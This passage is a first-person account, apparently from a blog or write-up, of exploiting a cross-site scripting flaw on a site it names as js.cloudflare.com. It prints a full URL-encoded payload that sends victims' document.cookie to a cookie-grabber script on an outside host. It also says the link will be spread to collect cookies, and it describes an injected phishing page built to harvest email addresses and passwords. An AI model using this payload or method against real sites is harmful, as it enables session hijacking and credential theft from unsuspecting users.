The malicious script that I've injected in that page, can access any cookies, session tokens, or other sensitive information retained by victim's browser and used with that site. The script can even rewrite the content of the HTML page.  \n\nYou can do a lot of stuff with this flaw but it is used most for stealing cookies or phishing users. Let's assume that I want to steal one user's cookies. First of all, I will make a cookie grabber script which will store users credentials on my server and after that I will insert it in the vulnerable page. The final link will be: \n\nhttp://js.cloudflare.com/%22%3E%3C%2Fiframe%3E%3Cscript%3Edocument.location.assign(%22http:%2F%2Fcode4free.com%2Ffz%2Fhome%2Fkie.php%3Fk=%22+document.cookie)%3C%2Fscript%3E\n\nNow, I can spread this link and collect cookies.\n\nAnother possibility is to create a phishing page which will be inserted in the vulnerable page and will make an user to re-login and send me his email and password. So, I've created a html page which will phish users credentials and store them on my server.
